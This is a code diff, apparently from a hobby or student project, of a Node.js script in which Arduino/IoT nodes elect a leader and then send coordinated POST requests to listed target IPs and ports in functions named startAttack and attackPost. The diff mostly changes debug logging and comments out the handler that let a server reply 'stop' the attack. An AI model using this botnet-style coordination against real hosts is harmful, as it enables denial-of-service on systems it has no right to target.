@@ -79,23 +79,16 @@ setTimeout(function postIP(){
     json: true,   // <--Very important!!!
     body: info
     }, function (error, response, body){
-        //console.log(body);
+        //Ignore the response
     })); 
     }, 1000
 );
 
 
 var controlLoop = setInterval(function(){
-    //console.log(info);
     postIOT();
     setTimeout(function(){
-        //console.log("Sleep 2 sec");
     },3000);  
-    // console.log("Leader?");
-    // console.log(leader);
-    // console.log("Posts");
-    // console.log(posts);
-    // console.log("Length: " + length);
         if(leader && posts == length)
         {
             console.log("I am the leader  and you shall Start Attacking my beatutiful babies");
@@ -131,14 +124,14 @@ function postIOT(){
                 //console.log(body);
             if(body != "ok")
             {   
-                if(body == "stop")
-                {
-                    attack = false;
-                    posts = 1;
-                    leaer = true;
-                }
-                else
-                {
+                //if(body == "stop")
+                //{
+                //    attack = false;
+                //    posts = 1;
+                //    leader = true;
+                //}
+                //else
+                //{
                     setTimeout(function(){
                     console.log("ARDUINOS");
                     arduinos = body.arduinos;
@@ -149,7 +142,7 @@ function postIOT(){
                     length = arduinos.length;
                     setLeader();
                     }, 1000);
-                }
+                //}
             }
             })); 
 };
@@ -157,6 +150,7 @@ function postIOT(){
 //Post para esoger el lider
 app.post("/leader", function(req, res){
     //console.log("ID" + req.body);
+    console.log(req.body.id);
     if(pid <= req.body.id)
     {
         //el pid recibido es mayor q el mio, no soy leader
@@ -202,6 +196,7 @@ function setLeader(){
     var i ;
     var pidjs = {};
     pidjs.id = pid
+    console.log(arduinos[i]);
     for(i = 0 ; i < length; i++)
     {
         (request({
@@ -244,6 +239,9 @@ function startAttack(){
             var attackjs = {};
             attackjs.position = 0;//Math.floor((Math.random() * length) - 1);
             attackjs.leader = info;
+
+            console.log("Start Attack");
+            console.log(attackjs);
             for(i = 0 ; i < length; i++)
             {
                 (request({
@@ -262,7 +260,7 @@ function attackPost(){
         console.log("Attacking");
         //console.log(attackInfo.ips[0])
         //console.log(attackInfo.ports[0])
-        
+        console.log(info);
         (request({
         url: "http://" + attackInfo.ips[attacking] + ":" + attackInfo.ports[attacking] + "/",
         method: "POST",
